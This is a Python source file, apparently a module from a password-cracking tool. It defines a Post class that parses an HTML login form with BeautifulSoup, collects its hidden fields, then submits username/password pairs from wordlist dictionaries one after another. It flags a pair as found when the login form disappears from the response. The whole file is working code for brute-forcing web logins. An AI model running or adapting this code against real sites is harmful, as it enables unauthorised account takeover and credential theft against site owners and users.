
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlencode

from modules.dictionary import Dictionary


class Post:

    def __init__(self, unit):
        self.unit = unit

    def crack(self, dictionaries):

        print('[<#########>] {0}'.format(self.unit.task))

        print('[COMPLEMENT] {0} - {1}'.format(self.unit.url, self.unit.complements))

        attrs = self.unit.task['attrs']

        if 'form' not in attrs:
            return {'status':-1, 'msg':'No "form" attribute'}

        if ('session' in attrs) and not attrs['session']:
            requester = requests
        else:
            attrs['session'] = True
            requester = requests.Session()

        # First request to take all info we need to continue (cookies for example)
        response = None
        if attrs['session'] and ('index' in attrs['form']):
            request = {'method':'get', 'url':self.unit.url}
            request.update(self.unit.complements)
            response = requester.request(**request)

        # Get indexed form
        fields = {}
        usr_field = None
        pwd_field = None
        if 'index' in attrs['form']:

            bs = BeautifulSoup(response.text)

            form = bs.find_all('form')[attrs['form']['index']]

            for inp in form.find_all('input', {'name':True, 'value':True}):
                fields[inp.attrs['name']] = inp.attrs['value']

            for inp in form.find_all('input', {'type':False}):
                inp.attrs['type'] = 'text'

            usr_field = form.find('input', {'name':True, 'type':'text'}).attrs['name']
            pwd_field = form.find('input', {'name':True, 'type':'password'}).attrs['name']

        print('[cracking.attrs] {0}'.format(attrs))

        if 'usr_field' in attrs['form']:
            usr_field = attrs['usr_field']

        if 'pwd_field' in attrs['form']:
            pwd_field = attrs['pwd_field']

        if not (usr_field and pwd_field):
            return {'status':-2, 'msg':'Incomplete form tag information'}

        # Update data fields
        if 'fields' in attrs['form']:
            fields.update(attrs['form']['fields'])

        # Start cracking
        request = {'method':'get', 'url':self.unit.url, 'data':fields}
        request.update(self.unit.complements)
        for dictionary in dictionaries:
            for username, password in Dictionary(**dictionary).pairs():
                print('[http] Forcing Username: {0} - Password: {1}'.format(username, password))

                request['data'][usr_field] = username
                request['data'][pwd_field] = password

                response = requester.request(**request)
                bs = BeautifulSoup(response.text)

                # Detect if the login was successful
                if 'fail' in attrs:
                    # This will be a complex structure
                    pass
                else:
                    form = bs.find('form')
                    if not (form and\
                       form.find('input', attrs={'name':usr_field}) and\
                       form.find('input', attrs={'name':pwd_field})):
                        self.unit.success({'username':username, 'password':password},
                                          {'data':request['data']})

                if ('reload' in attrs['form']) and (attrs['form']['reload']):
                    request['data'] = dict([(inp.attrs['name'], inp.attrs['value']) 
                                            for inp in form.find_all('input', {'type':'hidden'})])

        return {'status':0}